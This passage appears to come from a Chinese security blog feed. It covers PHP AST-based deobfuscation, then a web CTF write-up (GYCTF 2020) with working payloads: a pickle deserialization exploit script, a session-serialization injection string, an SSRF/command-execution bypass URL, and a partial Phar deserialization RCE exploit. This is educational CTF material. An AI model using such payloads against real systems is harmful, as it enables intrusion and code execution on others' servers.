<span class="keyword">return</span> <span class="keyword">new</span> Node\Expr\ArrayDimFetch( <span class="keyword">new</span> Node\Expr\Variable($arrName), <span class="keyword">new</span> Node\Scalar\String_($new_key_name) );</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123; <span class="comment">// 未替换该键值的操作</span></span><br><span class="line">                        <span class="keyword">$this</span>-&gt;arrReName[$arrName][$key] = <span class="keyword">$this</span>-&gt;arrCount[$arrName]++;</span><br><span class="line">                        $new_key_name = str_replace($key, <span class="string">'key_'</span> . <span class="keyword">$this</span>-&gt;arrReName[$arrName][$key], $key);</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">new</span> Node\Expr\ArrayDimFetch( <span class="keyword">new</span> Node\Expr\Variable($arrName), <span class="keyword">new</span> Node\Scalar\String_($new_key_name) );</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123; <span class="comment">// 未记录该数组</span></span><br><span class="line">                    <span class="comment">// 创建</span></span><br><span class="line">                    <span class="keyword">$this</span>-&gt;arrReName[$arrName] = [];</span><br><span class="line">                    <span class="comment">// 该数组计数</span></span><br><span class="line">                    <span class="keyword">$this</span>-&gt;arrCount[$arrName] = <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">$this</span>-&gt;arrReName[$arrName][$key] = <span class="keyword">$this</span>-&gt;arrCount[$arrName]++;</span><br><span class="line">                    $new_key_name = str_replace($key, <span class="string">'key_'</span> . <span class="keyword">$this</span>-&gt;arrReName[$arrName][$key], $key);</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span> Node\Expr\ArrayDimFetch( <span class="keyword">new</span> Node\Expr\Variable($arrName), <span class="keyword">new</span> Node\Scalar\String_($new_key_name) );</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="计算数字表达式"><a href="#计算数字表达式" class="headerlink" title="计算数字表达式"></a>计算数字表达式</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 计算表达式</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ExpressionToNumber</span> <span class="keyword">extends</span> <span class="title">NodeVisitorAbstract</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">leaveNode</span><span class="params">(Node $node)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($node <span class="keyword">instanceof</span> Node\Expr\BinaryOp\Plus &amp;&amp;</span><br><span class="line">            ($node-&gt;left <span class="keyword">instanceof</span> Node\Scalar\LNumber || $node-&gt;left <span class="keyword">instanceof</span> Node\Scalar\String_ || $node-&gt;left <span class="keyword">instanceof</span> Node\Expr\UnaryMinus) &amp;&amp; $node-&gt;right <span class="keyword">instanceof</span> Node\Expr\BinaryOp\Minus &amp;&amp; ($node-&gt;right-&gt;left <span class="keyword">instanceof</span> Node\Scalar\LNumber || $node-&gt;right-&gt;left <span class="keyword">instanceof</span> Node\Scalar\String_) &amp;&amp; ($node-&gt;right-&gt;right <span class="keyword">instanceof</span> Node\Scalar\LNumber || $node-&gt;right-&gt;right <span class="keyword">instanceof</span> Node\Scalar\String_)) &#123;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> ($node-&gt;left <span class="keyword">instanceof</span> Node\Expr\UnaryMinus) &#123;</span><br><span class="line">                $a = -($node-&gt;left-&gt;expr-&gt;value);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    $a = $node-&gt;left-&gt;value;</span><br><span class="line">            &#125;</span><br><span class="line">            $b = $node-&gt;right-&gt;left-&gt;value;</span><br><span class="line">            $c = $node-&gt;right-&gt;right-&gt;value;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> Node\Scalar\LNumber($a + $b - $c);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时通过再次使用 ArrayToConstant 遍历一下各节点就可以很好的去掉 unserialize + base64_decode 和 GLOBALS 混淆了</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/php-Deobfuscator.assets/image-20200324023908673.png" alt="image-20200324023908673"></p><h3 id="解-chr-函数混淆"><a href="#解-chr-函数混淆" class="headerlink" title="解 chr 函数混淆"></a>解 chr 函数混淆</h3><p>遍历 AST 找到  <code>(chr)(101)</code> 这类节点使用 chr 函数获取字符串值然后替换该节点</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 解 chr 函数混淆</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">chr2Str</span> <span class="keyword">extends</span> <span class="title">NodeVisitorAbstract</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">leaveNode</span><span class="params">(Node $node)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($node <span class="keyword">instanceof</span> Node\Expr\FuncCall &amp;&amp;</span><br><span class="line">            is_string($node-&gt;name-&gt;value) &amp;&amp;</span><br><span class="line">            $node-&gt;name-&gt;value == <span class="string">'chr'</span> &amp;&amp;</span><br><span class="line">            count($node-&gt;args) === <span class="number">1</span> &amp;&amp;</span><br><span class="line">            $node-&gt;args[<span class="number">0</span>] <span class="keyword">instanceof</span> Node\Arg &amp;&amp;</span><br><span class="line">            $node-&gt;args[<span class="number">0</span>]-&gt;value <span class="keyword">instanceof</span> Node\Scalar\LNumber</span><br><span class="line">        )&#123;</span><br><span class="line">            $the_num = $node-&gt;args[<span class="number">0</span>]-&gt;value-&gt;value;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> Node\Scalar\String_(chr($the_num));</span><br><span class="line">        &#125;    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时再计算一次数字表达式然后去 chr 函数，看看效果</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/php-Deobfuscator.assets/image-20200324024355732.png" alt="image-20200324024355732"></p><h3 id="解字符拼接混淆"><a href="#解字符拼接混淆" class="headerlink" title="解字符拼接混淆"></a>解字符拼接混淆</h3><p>找到 concat 节点，拼接左右的字符串</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 解字符拼接混淆</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">concat2Str</span> <span class="keyword">extends</span> <span class="title">NodeVisitorAbstract</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">leaveNode</span><span class="params">(Node $node)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($node <span class="keyword">instanceof</span> Node\Expr\BinaryOp\Concat)&#123;</span><br><span class="line">            <span class="keyword">if</span> ($node-&gt;left <span class="keyword">instanceof</span> Node\Scalar\String_ &amp;&amp; </span><br><span class="line">                is_string($node-&gt;left-&gt;value) &amp;&amp;</span><br><span class="line">                $node-&gt;right <span class="keyword">instanceof</span> Node\Scalar\String_ &amp;&amp;</span><br><span class="line">                is_string($node-&gt;right-&gt;value) </span><br><span class="line">                )&#123;</span><br><span class="line">                <span class="keyword">return</span>  <span class="keyword">new</span> Node\Scalar\String_($node-&gt;left-&gt;value . $node-&gt;right-&gt;value);    </span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/php-Deobfuscator.assets/image-20200324024553982.png" alt="image-20200324024553982"></p><h3 id="解-str-rot13-函数混淆"><a href="#解-str-rot13-函数混淆" class="headerlink" title="解 str_rot13 函数混淆"></a>解 str_rot13 函数混淆</h3><p>和上面解 chr 函数混淆差不多</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 解 str_rot13 函数混淆</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">rot13Decoder</span> <span class="keyword">extends</span> <span class="title">NodeVisitorAbstract</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">leaveNode</span><span class="params">(Node $node)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ( $node <span class="keyword">instanceof</span>  Node\Expr\FuncCall &amp;&amp;</span><br><span class="line">            $node-&gt;name <span class="keyword">instanceof</span> Node\Scalar\String_ &amp;&amp;</span><br><span class="line">            is_string( $node-&gt;name-&gt;value ) &amp;&amp;</span><br><span class="line">            $node-&gt;name-&gt;value == <span class="string">'str_rot13'</span> &amp;&amp;</span><br><span class="line">            count( $node-&gt;args ) === <span class="number">1</span> &amp;&amp;</span><br><span class="line">            $node-&gt;args[<span class="number">0</span>] <span class="keyword">instanceof</span> Node\Arg &amp;&amp;</span><br><span class="line">            $node-&gt;args[<span class="number">0</span>]-&gt;value <span class="keyword">instanceof</span> Node\Scalar\String_ &amp;&amp;</span><br><span class="line">            is_string($node-&gt;args[<span class="number">0</span>]-&gt;value-&gt;value)</span><br><span class="line">            )&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> Node\Scalar\String_(str_rot13($node-&gt;args[<span class="number">0</span>]-&gt;value-&gt;value));</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="解-call-user-func-array-函数混淆"><a href="#解-call-user-func-array-函数混淆" class="headerlink" title="解 call_user_func_array 函数混淆"></a>解 call_user_func_array 函数混淆</h3><p>最后如果觉得 <code>(&#39;call_user_func_array&#39;)(&#39;call_user_func_array&#39;, $var_1)</code> 这种样子不太直观也可以替换一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">callUserFuncDecoder</span> <span class="keyword">extends</span> <span class="title">NodeVisitorAbstract</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">leaveNode</span> <span class="params">(Node $node)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ( $node <span class="keyword">instanceof</span>  Node\Expr\FuncCall &amp;&amp;</span><br><span class="line">        $node-&gt;name <span class="keyword">instanceof</span> Node\Scalar\String_ &amp;&amp;</span><br><span class="line">        is_string( $node-&gt;name-&gt;value ) &amp;&amp;</span><br><span class="line">        $node-&gt;name-&gt;value == <span class="string">'call_user_func_array'</span> &amp;&amp;</span><br><span class="line">        count( $node-&gt;args ) === <span class="number">2</span> &amp;&amp;</span><br><span class="line">        $node-&gt;args[<span class="number">0</span>] <span class="keyword">instanceof</span> Node\Arg &amp;&amp;</span><br><span class="line">        $node-&gt;args[<span class="number">1</span>] <span class="keyword">instanceof</span> Node\Arg &amp;&amp;</span><br><span class="line">        $node-&gt;args[<span class="number">0</span>]-&gt;value <span class="keyword">instanceof</span> Node\Scalar\String_ &amp;&amp;</span><br><span class="line">        is_string($node-&gt;args[<span class="number">0</span>]-&gt;value-&gt;value) &amp;&amp;</span><br><span class="line">        $node-&gt;args[<span class="number">0</span>]-&gt;value-&gt;value == <span class="string">'call_user_func_array'</span></span><br><span class="line">        )&#123;</span><br><span class="line">            $varName = $node-&gt;args[<span class="number">1</span>]-&gt;value-&gt;name;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> Node\Expr\FuncCall(<span class="keyword">new</span> Node\Name(<span class="string">'call_user_func_array'</span>),[<span class="keyword">new</span> Node\Scalar\String_(<span class="string">'call_user_func_array'</span>), <span class="keyword">new</span> Node\Expr\Variable($varName)]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时已经基本没啥阅读障碍了</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/php-Deobfuscator.assets/image-20200324024953338.png" alt="image-20200324024953338"></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://blog.zsxsoft.com/post/42" target="_blank" rel="noopener">https://blog.zsxsoft.com/post/42</a></p><p><a href="https://github.com/nikic/PHP-Parser/blob/master/doc" target="_blank" rel="noopener">https://github.com/nikic/PHP-Parser/blob/master/doc</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;以前段时间 XCTF 抗疫赛中的 hardphp 为例，该题目最终只有一只战队解出，题目作者 zsx 也在随后的文章中点了下解混淆的思路，不过在各 writeup 中没有找到有关解混淆的完整的代码，于是学习一下通过修改 AST 节点解混淆的方法&lt;/p&gt;
    
    </summary>
    
    
      <category term="PHP" scheme="http://j0k3r.top/tags/PHP/"/>
    
      <category term="AST" scheme="http://j0k3r.top/tags/AST/"/>
    
      <category term="混淆" scheme="http://j0k3r.top/tags/%E6%B7%B7%E6%B7%86/"/>
    
  </entry>
  
  <entry>
    <title>高校战“疫”网络安全分享赛 Web Partial WriteUp</title>
    <link href="http://j0k3r.top/2020/03/12/GYCTF-2020-WriteUp/"/>
    <id>http://j0k3r.top/2020/03/12/GYCTF-2020-WriteUp/</id>
    <published>2020-03-11T16:00:00.000Z</published>
    <updated>2020-03-26T10:19:20.895Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读</p><a id="more"></a><h2 id="sqlcheckin"><a href="#sqlcheckin" class="headerlink" title="sqlcheckin"></a><strong>sqlcheckin</strong></h2><p>给出了源码（部分</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    $pdo = <span class="keyword">new</span> PDO(<span class="string">'mysql:host=localhost;dbname=sqlsql;charset=utf8;'</span>, <span class="string">'xxx'</span>, <span class="string">'xxx'</span>);</span><br><span class="line">    $pdo-&gt;setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC);</span><br><span class="line">    $stmt = $pdo-&gt;prepare(<span class="string">"SELECT username from users where username='$&#123;_POST['username']&#125;' and password='$&#123;_POST['password']&#125;'"</span>);</span><br><span class="line">    $stmt-&gt;execute();</span><br><span class="line">    $result = $stmt-&gt;fetchAll();</span><br><span class="line">    <span class="keyword">if</span> (count($result) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($result[<span class="number">0</span>][<span class="string">'username'</span>] == <span class="string">'admin'</span>) &#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="string">'flag.php'</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">    <span class="comment">// ....</span></span><br></pre></td></tr></table></figure><p>手动测了很久，发现挺严格的</p><p>waf 过滤不少字符和语句，最后用字典 fuzz 几次，就得到了 flag，这里利用的是 MySQL 字符串与数字比较会自动转换的一个 trick</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/GYCTF-2020-WriteUp.assets/image-20200307154020022.png" alt="image-20200307154020022"></p><h2 id="PHP-UAF"><a href="#PHP-UAF" class="headerlink" title="PHP-UAF"></a><strong>PHP-UAF</strong></h2><p>PHP 7.0 &lt; 7.4 (Unix) - ‘debug_backtrace’ disable_functions Bypass</p><p><a href="https://www.exploit-db.com/exploits/48072" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/48072</a></p><p><a href="https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass" target="_blank" rel="noopener">https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass</a></p><p>测试可以直接  <code>?cmd=print_r(file_put_contents(%27../111%27,%27test%27));</code> 写入文件</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/GYCTF-2020-WriteUp.assets/image-20200308000829347.png" alt="image-20200308000829347"></p><p>而且清理的并不及时，经常能看到师傅们留下的脚本</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/GYCTF-2020-WriteUp.assets/image-20200307235052761.png" alt="image-20200307235052761"></p><p>直接使用就行了</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/GYCTF-2020-WriteUp.assets/image-20200307235157336.png" alt="image-20200307235157336"></p><p>flag{SObARsac1TyC0V9B}</p><h2 id="webtmp"><a href="#webtmp" class="headerlink" title="webtmp"></a>webtmp</h2><p>Python 反序列化</p><p>不过过滤了 R 指令而且重写了<code>find_class</code>方法只允许包含<code>__main__</code>这一个 module</p><p>所以思路是通过 GLOBAL 指令引入变量，也就是题目中的 secret ，因为原变量的引用。在栈上修改它的值，从而导致原变量也被修改，覆盖原 secret，再最后反序列化即可，原理类似这篇文章：<a href="https://zhuanlan.zhihu.com/p/89132768" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/89132768</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: J0k3r</span></span><br><span class="line"><span class="comment"># @Date:   2020-03-07 17:29:27</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"><span class="keyword">import</span> secret</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name, category)</span>:</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.category = category</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f'Animal(name=<span class="subst">&#123;self.name!r&#125;</span>, category=<span class="subst">&#123;self.category!r&#125;</span>)'</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__eq__</span><span class="params">(self, other)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> type(other) <span class="keyword">is</span> Animal <span class="keyword">and</span> self.name == other.name <span class="keyword">and</span> self.category == other.category</span><br><span class="line"></span><br><span class="line">obj = Animal(<span class="string">'ccc'</span>, <span class="string">'zzz'</span>)</span><br><span class="line">pdv3 = pickle.dumps(obj,protocol=<span class="number">3</span>)</span><br><span class="line">p = pickletools.optimize(pdv3)</span><br><span class="line">pickletools.dis(p)</span><br><span class="line">payload_pre = <span class="string">b'\x80\x03c__main__\nsecret\n&#125;(Vname\nVccc\nVcategory\nVzzz\nub0'</span></span><br><span class="line">payload = payload_pre + p[<span class="number">2</span>:]</span><br><span class="line">print(payload)</span><br><span class="line">pickletools.dis(payload)</span><br><span class="line">pickle_data = base64.b64encode(payload).decode()</span><br><span class="line">print(pickle_data)</span><br></pre></td></tr></table></figure><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/GYCTF-2020-WriteUp.assets/image-20200308154240197.png" alt="image-20200308154240197"></p><p><code>flag{409ed945-5b77-4ec3-97e1-b395778842ba}</code></p><h2 id="hackme"><a href="#hackme" class="headerlink" title="hackme"></a>hackme</h2><p><a href="http://www.zip" target="_blank" rel="noopener">www.zip</a> 拿到源码</p><p>根据 php_serialize 和 php 两种 session 序列化引擎的不同，在填写签名的时候进行注入</p><p><code>name|s:5:&quot;admin&quot;;sign|a:1:{s:5:&quot;admin&quot;;i:1;}admin|i:1;</code></p><p>此时访问 /core，得到剩余源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'./init.php'</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (check_session($_SESSION)) &#123;</span><br><span class="line">    <span class="comment">#hint : core/clear.php</span></span><br><span class="line">    $sandbox = <span class="string">'./sandbox/'</span> . md5(<span class="string">"Mrk@1xI^"</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    <span class="keyword">echo</span> $sandbox;</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'url'</span>])) &#123;</span><br><span class="line">        $url = $_POST[<span class="string">'url'</span>];</span><br><span class="line">        <span class="keyword">if</span> (filter_var($url, FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (preg_match(<span class="string">'/(data:\/\/)|(&amp;)|(\|)|(\.\/)/i'</span>, $url)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"you are hacker"</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $res = parse_url($url);</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">'/127\.0\.0\.1$/'</span>, $res[<span class="string">'host'</span>])) &#123;</span><br><span class="line">                    $code = file_get_contents($url);</span><br><span class="line">                    <span class="keyword">if</span> (strlen($code) &lt;= <span class="number">4</span>) &#123;</span><br><span class="line">                        @exec($code);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">"try again"</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"invalid url"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'只有管理员才能看到我哟'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一看就是 host 绕过 + hitcon 2017 那个 babyfirst-revengev2 执行命令，不过当时这个没做出来，没想到用 <code>url=compress.zlib://data:@127.0.0.1/baidu.com?,ls</code> 绕，我 tcl</p><h2 id="webct"><a href="#webct" class="headerlink" title="webct"></a><strong>webct</strong></h2><p>题目 <a href="http://www.zip" target="_blank" rel="noopener">www.zip</a> 中给了源码</p><p>有 测试mysql服务器、文件上传，再看下 Listfile 类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Listfile</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file=$file;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">listdir</span><span class="params">()</span></span>&#123;</span><br><span class="line">        system(<span class="string">"ls "</span>.<span class="keyword">$this</span>-&gt;file).<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        system(<span class="string">"ls "</span>.<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>标准的 Mysql Client 任意文件读取 + Phar 反序列化进行 RCE</p><p>反序列化 exp：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fileupload</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file-&gt;xs();</span><br><span class="line">    